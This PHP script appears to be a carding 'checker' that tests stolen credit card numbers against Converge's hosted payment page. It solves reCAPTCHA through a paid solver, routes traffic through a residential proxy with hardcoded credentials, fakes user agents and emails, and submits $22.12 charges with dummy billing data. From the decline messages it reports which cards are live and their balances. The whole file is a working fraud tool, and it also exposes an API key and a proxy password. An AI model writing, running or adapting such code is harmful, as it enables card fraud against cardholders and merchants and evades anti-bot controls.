<?php
session_start();
error_reporting(0);

function multiexplode($string){
    $delimiters = array("|", ";", ":", "/", "»", "«", ">", "<");
    return explode($delimiters[0], str_replace($delimiters, $delimiters[0], $string));
}

function getStr($string, $start, $end){
    return explode($end, explode($start, $string)[1])[0];
}

function generateUserAgent() {
    $androidVersions = ['4.0', '4.1', '4.2', '4.3', '4.4', '5.0', '5.1', '6.0', '7.0', '7.1', '8.0', '8.1', '9.0', '10.0'];
    return 'Mozilla/5.0 (Linux; Android ' . $androidVersions[array_rand($androidVersions)] . '; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/' . rand(50, 99) . '.0.' . rand(1000, 9999) . '.0 Mobile Safari/537.36';
}

function generateEmail() {
    $domains = ["gmail.com", "hotmail.com", "yahoo.com", "outlook.com"];
    $domain = $domains[array_rand($domains)];
    return "user_" . time() . "_" . rand(1, 10000) . "@$domain";
}

$lista = $_GET['lista'];
$explodedList = multiexplode($lista);
$cc = $explodedList[0];
$mes = $explodedList[1];
$ano = $explodedList[2];
$cvv = $explodedList[3];
$ano2 = substr($ano, -2);

$primeirosSeisDigitos = substr($cc, 0, 6);


$email = generateEmail();

$ch = curl_init("https://api.capmonster.cloud/createTask");
curl_setopt_array($ch, [
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_CUSTOMREQUEST => 'POST',
    CURLOPT_HTTPHEADER => ['Content-Type: application/json;charset=UTF-8'],
    CURLOPT_POSTFIELDS => '{"clientKey":"b7592f5780d427cd6660148490910a9e","task":{"type":"RecaptchaV2TaskProxyless","websiteURL":"https://www.convergepay.com/hosted-payments/?ssl_txn_auth_token=Qkkl8p%2F0S5KFFsJiDmonSQAAAX1NJ%2F3i#!/payment-form","websiteKey":"6LdB5zUUAAAAAHLihxglXSadsWwyqMg4iuvXbj5a"}}'
]);

$task = json_decode(curl_exec($ch), true)['taskId'];
curl_close($ch);



$timeout = time() + 240;
$checkInterval = 0;
$start_time = time();

while (time() < $timeout) {
    usleep($checkInterval);

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://api.capmonster.cloud/getTaskResult");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Content-Type: application/json;charset=UTF-8',
    ));
    $data = array(
        "clientKey" => 'b7592f5780d427cd6660148490910a9e',
        "taskId" => $task
    );
    $jsonData = json_encode($data);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonData);

    $getResultResponse = curl_exec($ch);

    $getResultArray = json_decode($getResultResponse, true);

    if (isset($getResultArray["errorId"]) && $getResultArray["errorId"] === 0) {
        if (isset($getResultArray["status"]) && $getResultArray["status"] === "ready") {
           $captchaResponse = $getResultArray["solution"]["gRecaptchaResponse"];
            break;
        }
    }

    if ((time() - $start_time) > $timeout) {
        break;
    }
}

curl_close($ch);

$sslauth = $_POST['cookie1'];


$ch = curl_init("https://www.convergepay.com/hosted-payments/service/payment/hpp/initialize");
curl_setopt_array($ch, [
    CURLOPT_FOLLOWLOCATION => 1,
    CURLOPT_PROXY => 'http://2022magnata:FdvaPJSm3ol0Cn4H@proxy.packetstream.io:31112',
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_COOKIEFILE => getcwd() . '/coki.txt',
    CURLOPT_COOKIEJAR => getcwd() . '/coki.txt',
    CURLOPT_SSL_VERIFYPEER => 0,
    CURLOPT_SSL_VERIFYHOST => 0,
    CURLOPT_HTTPHEADER => [
        'Host: www.convergepay.com',
        'Connection: keep-alive',
        'sec-ch-ua: "Not_A Brand";v="8", "Chromium";v="120"',
        'Accept: application/json, text/plain, */*',
        'Content-Type: application/json;charset=UTF-8',
        "User-Agent: " . generateUserAgent(),
        'Origin: https://www.convergepay.com',
        'Referer: https://www.convergepay.com/hosted-payments/?ssl_txn_auth_token=foO8p%2BfyTsiwjaisyEOMNgAAAYytrvLR#!/'.$sslauth.'',
    ],
    CURLOPT_POSTFIELDS => '{"inline":false,"paymentFields":{"ssl_txn_auth_token":"'.$sslauth.'"},"context":null}',
]);

$wr = curl_exec($ch);
$context = getStr($wr, '"context":"' ,'",');
curl_close($ch);

$ch = curl_init("https://www.convergepay.com/hosted-payments/service/payment/hpp/process");
curl_setopt_array($ch, [
    CURLOPT_FOLLOWLOCATION => 1,
    CURLOPT_PROXY => 'http://2022magnata:FdvaPJSm3ol0Cn4H@proxy.packetstream.io:31112',
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_COOKIEFILE => getcwd() . '/coki.txt',
    CURLOPT_COOKIEJAR => getcwd() . '/coki.txt',
    CURLOPT_SSL_VERIFYPEER => 0,
    CURLOPT_SSL_VERIFYHOST => 0,
    CURLOPT_HTTPHEADER => [
        'Host: www.convergepay.com',
        'Connection: keep-alive',
        'sec-ch-ua: "Not_A Brand";v="8", "Chromium";v="120"',
        'Accept: application/json, text/plain, */*',
        'Content-Type: application/json;charset=UTF-8',
        "User-Agent: " . generateUserAgent(),
        'Origin: https://www.convergepay.com',
        'Referer: https://www.convergepay.com/hosted-payments/?ssl_txn_auth_token=foO8p%2BfyTsiwjaisyEOMNgAAAYytrvLR#!/'.$sslauth.'',
    ],
    CURLOPT_POSTFIELDS => '{"paymentData":{"ssl_amount":"2212","ssl_description":"aS","ssl_invoice_number":"AA","ssl_card_number":"'.$cc.'","ssl_exp_date":"'.$mes.''.$ano2.'","ssl_cvv2cvc2":"'.$cvv.'","ssl_first_name":"a","ssl_last_name":"a","ssl_avs_address":"a","ssl_city":"a","ssl_state":"a","ssl_avs_zip":"93101","ssl_country":"eua","ssl_email":"'.$email.'","ssl_phone":"18981532403"},"paymentType":"CREDITCARD","shippingSameAsBilling":true,"captchaToken":"'.$captchaResponse.'","context":"'.$context.'"}',
]);
 $wr2 = curl_exec($ch);
$code = getStr($wr2, '"ssl_result_message":"' ,'",');
$saldo = getStr($wr2, '"ssl_account_balance":"' ,'",');
curl_close($ch);

$status = (strpos($wr2,'DECLINED: NSF')|| strpos($wr2,'DECLINED CVV2')|| strpos($wr2,'PLEASE RETRY5270')) ? "Aprovada" : "Reprovada";
echo "<span class='badge badge-" . ($status == "Aprovada" ? "success" : "danger") . "' style='color:white'>$status </span> ➔ </span><span class='badge badge-primary' style='color:white'> $cc|$mes|$ano2|$cvv </span> ➜  <span class='badge badge-info' style='color:white'> Retorno: ($code) USD: $saldo</span> ➜ </span <span class='badge badge-" . ($status == "Aprovada" ? "success" : "danger") . "' style='color:white'>Time: (" . (time() - $start_time) . " SEG) ➜ @FkSanta</span></h5><br>";
?>
